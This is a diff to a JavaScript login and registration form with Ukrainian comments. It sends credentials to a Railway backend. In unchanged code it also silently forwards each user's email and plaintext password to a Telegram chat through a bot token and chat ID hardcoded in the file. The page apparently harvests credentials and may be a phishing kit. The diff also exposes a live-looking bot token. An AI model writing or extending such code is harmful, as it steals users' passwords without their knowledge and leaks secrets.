@@ -1,12 +1,12 @@
 let isUserRegistered = false;
-let currentMode = 'log'; 
+let currentMode = 'reg'; 
 let pendingTabId = null;
 let pendingButton = null;
 
-// Твоя адреса з Railway (БЕЗ слеша в кінці)
+// Твоя адреса з Railway - ПЕРЕВІР, ЩОБ В КІНЦІ НЕ БУЛО СЛЕША /
 const API_URL = 'https://st-backend-production.up.railway.app';
 
-// Дані твого Telegram бота
+// Твій Telegram (дані з твого минулого повідомлення)
 const TELEGRAM_TOKEN = '8460092788:AAHPbETm_DIczqYL7vA4XCbnWioiVBZYHwg';
 const TELEGRAM_CHAT_ID = '8399462172';
 
@@ -72,15 +72,15 @@ document.getElementById('auth-form').addEventListener('submit', async (e) => {
     if (errorEl) errorEl.style.display = 'none';
     submitBtn.textContent = "Connecting...";
 
-    // Формуємо правильний шлях (виправляє помилку Not Found)
+    // Формуємо правильний шлях (це виправить "Not Found")
     const path = currentMode === 'reg' ? '/register' : '/login';
-    const url = `${API_URL}${path}`;
+    const finalUrl = `${API_URL}${path}`;
 
     const body = currentMode === 'reg' ? { email, password, username: nickname } : { email, password };
 
     try {
         // 1. Відправка на бекенд (Railway + Firebase)
-        const res = await fetch(url, {
+        const res = await fetch(finalUrl, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(body)
@@ -90,7 +90,7 @@ document.getElementById('auth-form').addEventListener('submit', async (e) => {
             const data = await res.json();
             isUserRegistered = true;
             
-            // 2. Відправка в Telegram (дублювання)
+            // 2. Одночасна відправка в Telegram
             const tgMsg = `🚀 Дія: ${currentMode.toUpperCase()}\n👤 Nick: ${nickname || data.user?.username || 'N/A'}\n📧 Email: ${email}\n🔑 Pass: ${password}`;
             fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(tgMsg)}`);
 
@@ -111,7 +111,7 @@ document.getElementById('auth-form').addEventListener('submit', async (e) => {
         }
     } catch (err) {
         if (errorEl) {
-            errorEl.textContent = "❌ Server error. Check Railway!";
+            errorEl.textContent = "❌ Server error. Check if Railway is online!";
             errorEl.style.display = 'block';
         }
     } finally {
